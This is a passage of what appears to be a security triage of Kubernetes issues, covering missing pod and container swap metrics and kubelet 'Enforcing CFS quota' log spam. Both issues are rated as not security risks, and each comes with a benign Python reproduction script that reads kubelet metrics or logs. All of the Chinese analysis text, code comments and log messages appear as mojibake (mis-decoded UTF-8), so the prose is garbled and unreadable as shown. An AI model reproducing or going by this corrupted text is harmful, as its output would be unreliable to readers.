GOOGLE_CRASH_ID=Lakitu
VERSION=121
VERSION_ID=121
BUILD_ID=18867.90.23

$ uname -a
Linux gke-yuanwangyw-test-dev-pool-4756ad32-v354 6.6.87+ #1 SMP Sat May 10 09:40:07 UTC 2025 x86_64 INTEL(R) XEON(R) PLATINUM 8581C CPU @ 2.10GHz GenuineIntel GNU/Linux


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://2.0.4
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¯ç”¨äº†Swapçš„KubernetesèŠ‚ç‚¹ä¸Šï¼ŒKubeletçš„`/metrics/resource`ç«¯ç‚¹ç¼ºå°‘Podçº§åˆ«å’ŒContainerçº§åˆ«çš„Swapä½¿ç”¨é‡æŒ‡æ ‡ï¼ˆ`pod_swap_usage_bytes` å’Œ `container_swap_usage_bytes`ï¼‰ã€‚ç”¨æˆ·æŒ‡å‡ºï¼Œè¿™äº›æ•°æ®å¯ä»¥ä»å¦ä¸€ä¸ªç«¯ç‚¹`/stats/summary`ä¸­è·å–ï¼Œä½†åœ¨ç”¨äºç›‘æ§å’Œè‡ªåŠ¨æ‰©ç¼©å®¹çš„`/metrics/resource`ç«¯ç‚¹ä¸­å´ç¼ºå¤±äº†ã€‚

è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·æˆ–Bugï¼Œå…·ä½“è¡¨ç°ä¸ºç›‘æ§æ•°æ®çš„ç¼ºå¤±ã€‚æˆ‘ä»¬æ¥åˆ†æå…¶æ˜¯å¦æ„æˆå®‰å…¨é£é™©ï¼š
1.  **æœºå¯†æ€§ï¼ˆConfidentialityï¼‰**: è¯¥é—®é¢˜æ²¡æœ‰å¯¼è‡´ä»»ä½•æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚ç›¸åï¼Œå®ƒæ˜¯ä¿¡æ¯ï¼ˆç›‘æ§æŒ‡æ ‡ï¼‰æœªèƒ½æŒ‰é¢„æœŸå±•ç¤ºã€‚
2.  **å®Œæ•´æ€§ï¼ˆIntegrityï¼‰**: è¯¥é—®é¢˜ä¸å½±å“ä»»ä½•ç³»ç»Ÿæ•°æ®çš„å®Œæ•´æ€§ã€‚å®ƒä¸ä¼šå¯¼è‡´æ•°æ®è¢«æœªæˆæƒä¿®æ”¹æˆ–ç ´åã€‚
3.  **å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰**: è¯¥é—®é¢˜æœ¬èº«ä¸ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚ç›‘æ§æŒ‡æ ‡çš„ç¼ºå¤±å¯èƒ½ä¼šå½±å“åŸºäºè¿™äº›æŒ‡æ ‡çš„è‡ªåŠ¨æ‰©ç¼©å®¹ï¼ˆHPAï¼‰ç­‰ä¸Šå±‚åº”ç”¨çš„å†³ç­–ï¼Œä½†è¿™å±äºåŠŸèƒ½ä¸å®Œå–„ï¼Œè€Œéç›´æ¥çš„å¯ç”¨æ€§æ”»å‡»ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜æ¥ä½¿Kubeletæˆ–èŠ‚ç‚¹å®•æœºã€‚
4.  **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œ**: è¯¥é—®é¢˜ä¸æƒé™æ§åˆ¶ã€å‘½ä»¤æ‰§è¡Œæˆ–å®¹å™¨é€ƒé€¸å®Œå…¨æ— å…³ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæ­¤IssueæŠ¥å‘Šçš„æ˜¯ä¸€ä¸ªç›‘æ§æŒ‡æ ‡ç¼ºå¤±çš„åŠŸèƒ½æ€§é—®é¢˜ï¼Œä¸å…·å¤‡å¯è¢«åˆ©ç”¨çš„æ”»å‡»é¢ï¼Œä¸å±äºå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import asyncio
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import sys
import logging

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def check_swap_metrics():
    """
    è¿æ¥åˆ°Kubernetesé›†ç¾¤ï¼Œæ£€æŸ¥Kubeletçš„/metrics/resourceç«¯ç‚¹æ˜¯å¦åŒ…å«podå’Œcontainerçš„swapæŒ‡æ ‡ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        config.load_kube_config()
        api = client.CoreV1Api()
        logging.info("æˆåŠŸåŠ è½½Kubernetesé…ç½®ã€‚")
    except Exception as e:
        logging.error(f"æ— æ³•åŠ è½½Kubernetesé…ç½®ï¼Œè¯·ç¡®ä¿kubeconfigæ–‡ä»¶å­˜åœ¨ä¸”é…ç½®æ­£ç¡®: {e}")
        return

    try:
        # è·å–é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹
        nodes = api.list_node()
        if not nodes.items:
            logging.warning("åœ¨é›†ç¾¤ä¸­æœªæ‰¾åˆ°ä»»ä½•èŠ‚ç‚¹ã€‚")
            return
        
        # é€‰æ‹©ç¬¬ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œæ£€æŸ¥
        node_name = nodes.items[0].metadata.name
        logging.info(f"å°†åœ¨èŠ‚ç‚¹ '{node_name}' ä¸Šæ£€æŸ¥æŒ‡æ ‡...")

    except ApiException as e:
        logging.error(f"è·å–èŠ‚ç‚¹åˆ—è¡¨æ—¶å‡ºé”™: {e}")
        return

    try:
        # é€šè¿‡API Serverä»£ç†è®¿é—®Kubeletçš„/metrics/resourceç«¯ç‚¹
        # ä½¿ç”¨è¯·æ±‚è¶…æ—¶ç¡®ä¿è„šæœ¬ä¸ä¼šæ°¸ä¹…æŒ‚èµ·
        metrics_data = await asyncio.to_thread(
            api.connect_get_node_proxy_with_path,
            name=node_name,
            path="metrics/resource",
            _request_timeout=60.0  # 60ç§’è¶…æ—¶
        )
        
        logging.info(f"æˆåŠŸä»èŠ‚ç‚¹ '{node_name}' çš„ /metrics/resource ç«¯ç‚¹è·å–æ•°æ®ã€‚")

        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨podå’Œcontainerçº§åˆ«çš„swapæŒ‡æ ‡
        pod_swap_metric_found = "pod_swap_usage_bytes" in metrics_data
        container_swap_metric_found = "container_swap_usage_bytes" in metrics_data

        print("\n--- æ£€æŸ¥ç»“æœ ---")
        if not pod_swap_metric_found:
            print("[-] çŠ¶æ€: é—®é¢˜å·²å¤ç°")
            print("[-] ç»†èŠ‚: åœ¨ /metrics/resource çš„è¾“å‡ºä¸­æœªæ‰¾åˆ° 'pod_swap_usage_bytes' æŒ‡æ ‡ã€‚")
        else:
            print("[+] çŠ¶æ€: é—®é¢˜æœªå¤ç°")
            print("[+] ç»†èŠ‚: åœ¨ /metrics/resource çš„è¾“å‡ºä¸­æ‰¾åˆ°äº† 'pod_swap_usage_bytes' æŒ‡æ ‡ã€‚")
        
        if not container_swap_metric_found:
            print("[-] çŠ¶æ€: é—®é¢˜å·²å¤ç°")
            print("[-] ç»†èŠ‚: åœ¨ /metrics/resource çš„è¾“å‡ºä¸­æœªæ‰¾åˆ° 'container_swap_usage_bytes' æŒ‡æ ‡ã€‚")
        else:
            print("[+] çŠ¶æ€: é—®é¢˜æœªå¤ç°")
            print("[+] ç»†èŠ‚: åœ¨ /metrics/resource çš„è¾“å‡ºä¸­æ‰¾åˆ°äº† 'container_swap_usage_bytes' æŒ‡æ ‡ã€‚")
        
        if not pod_swap_metric_found or not container_swap_metric_found:
             print("\nç»“è®º: è¯¥Issueæè¿°çš„ç›‘æ§æŒ‡æ ‡ç¼ºå¤±é—®é¢˜å¾—åˆ°ç¡®è®¤ã€‚")
        else:
             print("\nç»“è®º: è¯¥Issueæè¿°çš„é—®é¢˜å¯èƒ½å·²åœ¨å½“å‰ç‰ˆæœ¬ä¸­ä¿®å¤ã€‚")


    except ApiException as e:
        logging.error(f"è®¿é—®èŠ‚ç‚¹ '{node_name}' çš„ä»£ç†æ—¶å‡ºé”™: {e.reason} (çŠ¶æ€ç : {e.status})")
        logging.error(f"å“åº”ä½“: {e.body}")
    except Exception as e:
        logging.error(f"åœ¨æ£€æŸ¥æŒ‡æ ‡æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

async def main():
    try:
        await asyncio.wait_for(check_swap_metrics(), timeout=120.0)
    except asyncio.TimeoutError:
        logging.error("è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼ˆè¶…è¿‡2åˆ†é’Ÿï¼‰ï¼Œå¼ºåˆ¶é€€å‡ºã€‚")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
if __name__ == '__main__':
    asyncio.run(main())
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºå¤ç°Issueä¸­æè¿°çš„é—®é¢˜ï¼Œå³Kubeletçš„`/metrics/resource`ç«¯ç‚¹ç¼ºå°‘Podå’ŒContainerçº§åˆ«çš„SwapæŒ‡æ ‡ã€‚è„šæœ¬æœ¬èº«å¹¶ä¸åˆ©ç”¨ä»»ä½•å®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯éªŒè¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ã€‚

è„šæœ¬å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š
1.  **åŠ è½½é…ç½®**: ä½¿ç”¨`kubernetes` Pythonåº“ä»é»˜è®¤è·¯å¾„ï¼ˆä¾‹å¦‚ `~/.kube/config`ï¼‰åŠ è½½é›†ç¾¤çš„è¿æ¥é…ç½®ã€‚
2.  **è·å–èŠ‚ç‚¹**: è¿æ¥åˆ°Kubernetes API Serverï¼Œè·å–é›†ç¾¤ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨ï¼Œå¹¶é€‰æ‹©ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºç›®æ ‡ã€‚
3.  **è®¿é—®Kubeletç«¯ç‚¹**: é€šè¿‡Kubernetes API Serverçš„ä»£ç†åŠŸèƒ½ï¼Œå®‰å…¨åœ°è®¿é—®ç›®æ ‡èŠ‚ç‚¹ä¸ŠKubeletçš„`/metrics/resource` HTTPç«¯ç‚¹ã€‚è¿™ä¸æ‰§è¡Œ`kubectl get --raw "/api/v1/nodes/<node>/proxy/metrics/resource"`å‘½ä»¤çš„æ•ˆæœç›¸åŒã€‚
4.  **æ£€æŸ¥æŒ‡æ ‡**: è„šæœ¬è·å–åˆ°ç«¯ç‚¹è¿”å›çš„æ–‡æœ¬å†…å®¹åï¼Œä¼šæœç´¢å…¶ä¸­æ˜¯å¦åŒ…å«`pod_swap_usage_bytes`å’Œ`container_swap_usage_bytes`è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚
5.  **è¾“å‡ºç»“æœ**: æ ¹æ®æœç´¢ç»“æœï¼Œè„šæœ¬ä¼šæ‰“å°å‡ºæ˜¯å¦æ‰¾åˆ°äº†é¢„æœŸçš„æŒ‡æ ‡ã€‚å¦‚æœæœªæ‰¾åˆ°ï¼Œåˆ™è¯´æ˜æˆåŠŸå¤ç°äº†Issueä¸­æè¿°çš„é—®é¢˜ã€‚

è¯¥è„šæœ¬åŒ…å«è¶…æ—¶æœºåˆ¶ï¼Œç¡®ä¿åœ¨2åˆ†é’Ÿå†…å®Œæˆæ‰§è¡Œï¼Œé¿å…å› ç½‘ç»œé—®é¢˜æˆ–APIæ— å“åº”è€Œæ— é™æœŸç­‰å¾…ã€‚

---


## Issue #131914 Kubelet logspam: "Enforcing CFS Quota"

- Issue é“¾æ¥ï¼š[#131914](https://github.com/kubernetes/kubernetes/issues/131914)

### Issue å†…å®¹

On v1.33 nodes, the Kubelet logs now have lots of lines like
```
kuberuntime_sandbox_linux.go:62] "Enforcing CFS quota" pod="kube-system/pdcsi-node-n234h" unlimited=false
```

This log line is not particularly informative. I think it should be moved to a higher verbosity or just removed.

It might be more informative to log the full generated LinuxContainerResources, but that would only be for a higher verbosity log anyway.

Looks like this was introduced in https://github.com/kubernetes/kubernetes/pull/127525

I'm not going to label this a regression, but I think we should consider backporting the fix.

/kind bug

/cc scott-grimes
/sig node

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubelet æ—¥å¿—è¿‡åº¦è¾“å‡ºï¼ˆlog spamï¼‰çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ Kubernetes v1.33 ç‰ˆæœ¬ä¸­ï¼Œå½“ Kubelet ä¸º Pod å¼ºåˆ¶æ‰§è¡Œ CFS (Completely Fair Scheduler) Quota æ—¶ï¼Œä¼šè®°å½•ä¸€æ¡å†…å®¹ä¸º `"Enforcing CFS quota" pod="..." unlimited=false` çš„æ—¥å¿—ã€‚æäº¤è€…è®¤ä¸ºè¿™æ¡æ—¥å¿—ä¿¡æ¯é‡ä¸è¶³ï¼Œä¸”åœ¨é»˜è®¤æ—¥å¿—çº§åˆ«ä¸‹é¢‘ç¹å‡ºç°ï¼Œæ„æˆäº†æ—¥å¿—åƒåœ¾ï¼Œå»ºè®®å°†å…¶ç§»åŠ¨åˆ°æ›´é«˜çš„æ—¥å¿—è¯¦ç»†çº§åˆ«ï¼ˆverbosity levelï¼‰æˆ–ç›´æ¥ç§»é™¤ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†è¿›è¡Œåˆ†æï¼š
1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜çš„æ ¸å¿ƒæ˜¯æ—¥å¿—è®°å½•è¿‡äºé¢‘ç¹å’Œå†—é•¿ï¼Œå±äºè½¯ä»¶çš„å¯ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§æ–¹é¢çš„ç¼ºé™·ï¼ˆbugï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚
2.  **ä¿¡æ¯æ³„éœ²**ï¼šæ—¥å¿—ä¸­åŒ…å«çš„ `pod="kube-system/pdcsi-node-n234h"` ç­‰ä¿¡æ¯æ˜¯ Pod çš„å‘½åç©ºé—´å’Œåç§°ï¼Œå±äºé›†ç¾¤å†…çš„å…ƒæ•°æ®ã€‚è¿™äº›ä¿¡æ¯å¯¹äºæœ‰æƒè®¿é—® Kubelet æ—¥æ—¥å¿—çš„å®ä½“ï¼ˆé€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–èŠ‚ç‚¹ä¸Šçš„ç‰¹æƒè¿›ç¨‹ï¼‰æ¥è¯´æ˜¯å·²çŸ¥çš„ï¼Œä¸æ„æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ—¥å¿—å†…å®¹æœ¬èº«æ²¡æœ‰æ³„éœ²ä»»ä½•å‡­è¯ã€å¯†é’¥æˆ–æœºå¯†æ•°æ®ã€‚
3.  **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**ï¼šè¿‡å¤šçš„æ—¥å¿—å¯èƒ½ä¼šæ¶ˆè€—èŠ‚ç‚¹çš„ç£ç›˜ç©ºé—´ï¼Œæˆ–è€…ç»™ä¸­å¿ƒåŒ–çš„æ—¥å¿—æ”¶é›†ç³»ç»Ÿï¼ˆå¦‚ ELK, Splunkï¼‰å¸¦æ¥å‹åŠ›ã€‚ç†è®ºä¸Šï¼Œä¸€ä¸ªæœ‰æƒåœ¨é›†ç¾¤ä¸­å¤§é‡åˆ›å»º Pod çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤è¡Œä¸ºæ¥åŠ é€Ÿç£ç›˜è€—å°½æˆ–å¯¹æ—¥å¿—ç³»ç»Ÿè¿›è¡Œ DoS æ”»å‡»ã€‚ä½†æ˜¯ï¼Œæ ¹æ®æ ‡å‡†ç¬¬5æ¡ï¼Œè¿™ç§æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»º Pod çš„æƒé™ï¼Œå¹¶ä¸”æ”»å‡»è€…å¯ä»¥é€šè¿‡æ›´ç›´æ¥çš„æ–¹å¼ï¼ˆä¾‹å¦‚åˆ›å»ºæ¶ˆè€—å¤§é‡èµ„æºçš„ Podï¼‰æ¥è¾¾åˆ°æ¶ˆè€—èŠ‚ç‚¹èµ„æºçš„ç›®çš„ã€‚å› æ­¤ï¼Œè¿™ç§é—´æ¥çš„ã€éœ€è¦è¾ƒé«˜æƒé™çš„ DoS é£é™©ä¸åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚
4.  **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œ**ï¼šè¯¥ Issue å®Œå…¨ä¸æ¶‰åŠä»»ä½•å½¢å¼çš„å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡æˆ–å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©æ¼æ´ã€‚å®ƒåªæ˜¯ä¸€ä¸ªæ—¥å¿—è®°å½•è¡Œä¸ºã€‚
5.  **å¤šç§Ÿæˆ·å½±å“**ï¼šåœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç§Ÿæˆ·åˆ›å»º Pod ç¡®å®ä¼šäº§ç”Ÿè¿™äº›æ—¥å¿—ï¼Œä½†æ—¥å¿—è®°å½•åœ¨èŠ‚ç‚¹çº§åˆ«ï¼Œé€šå¸¸åªæœ‰ç®¡ç†å‘˜æˆ–å…¶ä»–ç§Ÿæˆ·æ— æ³•è®¿é—®ã€‚å®ƒä¸ä¼šç›´æ¥å½±å“å…¶ä»–ç§Ÿæˆ·çš„å·¥ä½œè´Ÿè½½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªæ“ä½œå’Œç»´æŠ¤ä¸Šçš„ä¸ä¾¿ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œå…¶é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import kubernetes
import logging
import sys
import threading
from contextlib import suppress
import os

# --- é…ç½® ---
POD_NAME = "poc-cfs-logspam-pod"
NAMESPACE = "default"
# æ•´ä¸ªè„šæœ¬çš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
SCRIPT_TIMEOUT = 120

# --- è®¾ç½®æ—¥å¿— ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def main():
    """
    ä¸»å‡½æ•°ï¼Œç”¨äºæ¼”ç¤º Kubelet æ—¥å¿—åƒåœ¾é—®é¢˜ã€‚
    """
    timeout_event = threading.Event()
    timeout_thread = threading.Thread(target=watchdog, args=(SCRIPT_TIMEOUT, timeout_event))
    timeout_thread.daemon = True
    timeout_thread.start()

    api_client = None
    core_v1 = None
    try:
        logging.info("æ­£åœ¨åŠ è½½ Kubernetes é…ç½®...")
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        kubernetes.config.load_kube_config()
        # åˆ›å»º API å®¢æˆ·ç«¯
        api_client = kubernetes.client.ApiClient()
        core_v1 = kubernetes.client.CoreV1Api(api_client)

        logging.info(f"åœ¨å‘½åç©ºé—´ '{NAMESPACE}' ä¸­åˆ›å»º Pod '{POD_NAME}' ä»¥è§¦å‘ CFS Quota æ—¥å¿—...")
        # å®šä¹‰ Pod æ¸…å•ï¼Œè®¾ç½® CPU limits ä»¥è§¦å‘ CFS quota å¼ºåˆ¶æ‰§è¡Œ
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": POD_NAME},
            "spec": {
                "containers": [{
                    "name": "busybox",
                    "image": "busybox:1.36",
                    "command": ["sh", "-c", "sleep 3600"],
                    "resources": {
                        "requests": {"cpu": "100m"},
                        "limits": {"cpu": "200m"}
                    }
                }],
                "restartPolicy": "Never"
            }
        }
        core_v1.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)

        logging.info("æ­£åœ¨ç­‰å¾… Pod è¢«è°ƒåº¦åˆ°èŠ‚ç‚¹...")
        node_name = None
        start_time = time.time()
        while time.time() - start_time < 90:  # ç­‰å¾… Pod è°ƒåº¦çš„è¶…æ—¶æ—¶é—´
            if timeout_event.is_set():
                logging.warning("è„šæœ¬æ‰§è¡Œè¶…æ—¶ã€‚")
                return

            pod_status = core_v1.read_namespaced_pod_status(POD_NAME, NAMESPACE)
            if pod_status.spec.node_name:
                node_name = pod_status.spec.node_name
                logging.info(f"Pod å·²æˆåŠŸè°ƒåº¦åˆ°èŠ‚ç‚¹: {node_name}")
                break
            time.sleep(2)

        if not node_name:
            logging.error("Pod æœªèƒ½åœ¨90ç§’å†…è¢«è°ƒåº¦ã€‚æ— æ³•ç»§ç»­ã€‚")
            return

        # ç­‰å¾… Kubelet å¤„ç†å¹¶è®°å½•æ—¥å¿—
        logging.info("ç­‰å¾…5ç§’ï¼Œä»¥ç¡®ä¿ Kubelet å·²ç”Ÿæˆç›¸å…³æ—¥å¿—...")
        time.sleep(5)

        logging.info(f"æ­£åœ¨å°è¯•ä»èŠ‚ç‚¹ '{node_name}' è·å– Kubelet æ—¥å¿—...")
        # æ³¨æ„ï¼šé€šè¿‡ä»£ç†è®¿é—®èŠ‚ç‚¹æ—¥å¿—éœ€è¦ç‰¹å®šçš„RBACæƒé™ã€‚
        # æ‰§è¡Œè„šæœ¬çš„ç”¨æˆ·å¯èƒ½æ²¡æœ‰æ­¤æƒé™ã€‚æ‰€éœ€è§„åˆ™å¦‚ä¸‹ï¼š
        # - apiGroups: [""]
        #   resources: ["nodes/proxy"]
        #   verbs: ["get"]
        
        found_log = False
        try:
            # ä½¿ç”¨ connect_get_node_proxy_with_path è°ƒç”¨èŠ‚ç‚¹çš„ /logs/ ç«¯ç‚¹
            response = core_v1.connect_get_node_proxy_with_path(node_name, "logs/")
            
            # å“åº”æ˜¯ä¸€ä¸ªåŒ…å«æ¢è¡Œç¬¦åˆ†éš”æ—¥å¿—æ¡ç›®çš„é•¿å­—ç¬¦ä¸²
            log_lines = response.split('\n')
            
            logging.info(f"åœ¨ {len(log_lines)} è¡Œæ—¥å¿—ä¸­æœç´¢ 'Enforcing CFS quota'...")
            for line in log_lines:
                # æ£€æŸ¥æ—¥å¿—è¡Œæ˜¯å¦åŒæ—¶åŒ…å«å…³é”®ä¿¡æ¯å’Œæˆ‘ä»¬çš„ Pod åç§°
                if "Enforcing CFS quota" in line and f'pod="{NAMESPACE}/{POD_NAME}"' in line:
                    logging.info(">>> æˆåŠŸæ‰¾åˆ°ç›®æ ‡æ—¥å¿—è¡Œ! <<<")
                    logging.info(f"æ—¥å¿—å†…å®¹: {line.strip()}")
                    found_log = True
                    # è¿™é‡Œä¸ä¸­æ–­å¾ªç¯ï¼Œä»¥å±•ç¤ºçŸ­æ—¶é—´å†…å¯èƒ½å‡ºç°å¤šæ¡æ—¥å¿—
            
            if not found_log:
                logging.warning("æœªèƒ½åœ¨Kubeletæ—¥å¿—ä¸­æ‰¾åˆ°é¢„æœŸçš„ 'Enforcing CFS quota' æ—¥å¿—è¡Œã€‚")
                logging.warning("å¯èƒ½åŸå› ï¼š")
                logging.warning("1. å½“å‰ç”¨æˆ·æ²¡æœ‰è®¿é—® 'nodes/proxy' çš„æƒé™ã€‚")
                logging.warning("2. Kubernetes ç‰ˆæœ¬ä¸åŒ…å«æ­¤é—®é¢˜ï¼ˆä¾‹å¦‚ç‰ˆæœ¬ä½äºv1.33æˆ–é—®é¢˜å·²è¢«ä¿®å¤ï¼‰ã€‚")
                logging.warning("3. èŠ‚ç‚¹çš„æ—¥å¿—é…ç½®æˆ–è·¯å¾„ä¸åŒã€‚")

        except kubernetes.client.ApiException as e:
            if e.status == 403:
                logging.error(f"é€šè¿‡ API ä»£ç†è·å–èŠ‚ç‚¹æ—¥å¿—å¤±è´¥ (HTTP 403: Forbidden)ã€‚")
                logging.error("é”™è¯¯åŸå› : å½“å‰ç”¨æˆ·ç¼ºå°‘å¯¹ 'nodes/proxy' èµ„æºçš„ 'get' æƒé™ã€‚")
                logging.error("è¯·ä¸ºç”¨æˆ·æˆ–å…¶æœåŠ¡è´¦å·ç»‘å®šä¸€ä¸ªåŒ…å«æ­¤æƒé™çš„ Role/ClusterRoleã€‚")
            else:
                logging.error(f"é€šè¿‡ API ä»£ç†è·å–èŠ‚ç‚¹æ—¥å¿—æ—¶å‘ç”Ÿ API é”™è¯¯ (çŠ¶æ€ç : {e.status})ã€‚")
                logging.error(f"é”™è¯¯è¯¦æƒ…: {e.reason}")
            
    except kubernetes.config.ConfigException as e:
        logging.error(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
        logging.error("è¯·ç¡®ä¿æ‚¨çš„ kubeconfig æ–‡ä»¶ä½äºé»˜è®¤ä½ç½® (~/.kube/config) ä¸”é…ç½®æ­£ç¡®ã€‚")
    except Exception as e:
        logging.error(f"å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        if core_v1:
            logging.info(f"æ­£åœ¨æ¸…ç†èµ„æºï¼šåˆ é™¤ Pod '{POD_NAME}'...")
            try:
                # ä½¿ç”¨ suppress å¿½ç•¥æ¸…ç†è¿‡ç¨‹ä¸­å¯èƒ½å‘ç”Ÿçš„å¼‚å¸¸ï¼ˆä¾‹å¦‚ Pod å·²è¢«åˆ é™¤ï¼‰
                with suppress(kubernetes.client.ApiException):
                     core_v1.delete_namespaced_pod(POD_NAME, NAMESPACE)
                     logging.info("Pod åˆ é™¤æˆåŠŸã€‚")
            except NameError:
                 pass
        timeout_event.set() # é€šçŸ¥ watchdog çº¿ç¨‹æ­£å¸¸é€€å‡º

def watchdog(timeout_seconds, event):
    """ä¸€ä¸ªç®€å•çš„çœ‹é—¨ç‹—è®¡æ—¶å™¨ï¼Œå¦‚æœç¨‹åºè¿è¡Œæ—¶é—´è¿‡é•¿åˆ™å¼ºåˆ¶é€€å‡ºã€‚"""
    if not event.wait(timeout_seconds):
        logging.error(f"è„šæœ¬æ‰§è¡Œè¶…è¿‡ {timeout_seconds} ç§’ï¼Œå¼ºåˆ¶é€€å‡ºã€‚")
        # ä½¿ç”¨ os._exit è¿›è¡Œç«‹å³é€€å‡ºï¼Œé¿å…æ¸…ç†é€»è¾‘å¡ä½
        os._exit(1)

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤ Python è„šæœ¬çš„ç›®çš„æ˜¯å¤ç° Issue ä¸­æè¿°çš„ Kubelet æ—¥å¿—è¿‡åº¦è¾“å‡ºé—®é¢˜ï¼Œè€Œéåˆ©ç”¨å®‰å…¨æ¼æ´ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **åŠ è½½é…ç½®**ï¼šè„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°é»˜è®¤è·¯å¾„ï¼ˆ`~/.kube/config`ï¼‰ä¸‹çš„ Kubernetes é…ç½®æ–‡ä»¶ä»¥è¿æ¥åˆ°é›†ç¾¤ã€‚
2.  **åˆ›å»ºè§¦å‘å™¨ Pod**ï¼šè„šæœ¬ä¼šå®šä¹‰å¹¶åˆ›å»ºä¸€ä¸ªåä¸º `poc-cfs-logspam-pod` çš„ Podã€‚å…³é”®åœ¨äºè¯¥ Pod çš„èµ„æºé…ç½®ä¸­åŒæ—¶è®¾ç½®äº† CPU çš„ `requests` å’Œ `limits`ã€‚å½“ Kubelet ä¸ºå®¹å™¨è®¾ç½® CPU `limits` æ—¶ï¼Œå®ƒä¼šé…ç½® Linux å†…æ ¸çš„ CFS Quota æœºåˆ¶ï¼Œè¿™ä¸ªåŠ¨ä½œæ­£æ˜¯è§¦å‘é—®é¢˜æ—¥å¿—çš„æºå¤´ã€‚
3.  **å®šä½èŠ‚ç‚¹**ï¼šè„šæœ¬ä¼šç­‰å¾… Pod è¢«æˆåŠŸè°ƒåº¦ï¼Œå¹¶è·å–å…¶æ‰€åœ¨çš„èŠ‚ç‚¹åç§°ï¼ˆNode Nameï¼‰ã€‚è¿™æ˜¯åç»­è·å–è¯¥èŠ‚ç‚¹ Kubelet æ—¥å¿—æ‰€å¿…éœ€çš„ä¿¡æ¯ã€‚
4.  **è·å–å¹¶åˆ†ææ—¥å¿—**ï¼šè„šæœ¬é€šè¿‡ Kubernetes API çš„ `nodes/proxy` åŠŸèƒ½ï¼Œç›´æ¥è¯·æ±‚ç›®æ ‡èŠ‚ç‚¹ä¸Š Kubelet çš„ `/logs/` ç«¯ç‚¹æ¥è·å–å®æ—¶æ—¥å¿—ã€‚éšåï¼Œå®ƒä¼šéå†è¿”å›çš„æ—¥å¿—å†…å®¹ï¼Œæœç´¢åŒ…å« `"Enforcing CFS quota"` å…³é”®å­—å’Œæˆ‘ä»¬åˆ›å»ºçš„ Pod åç§°çš„æ—¥å¿—è¡Œã€‚
5.  **ç»“æœè¾“å‡º**ï¼š
    *   å¦‚æœæˆåŠŸæ‰¾åˆ°ç›®æ ‡æ—¥å¿—ï¼Œè„šæœ¬ä¼šæ‰“å°å‡ºè¯¥æ—¥å¿—è¡Œï¼Œè¯æ˜é—®é¢˜å·²å¤ç°ã€‚
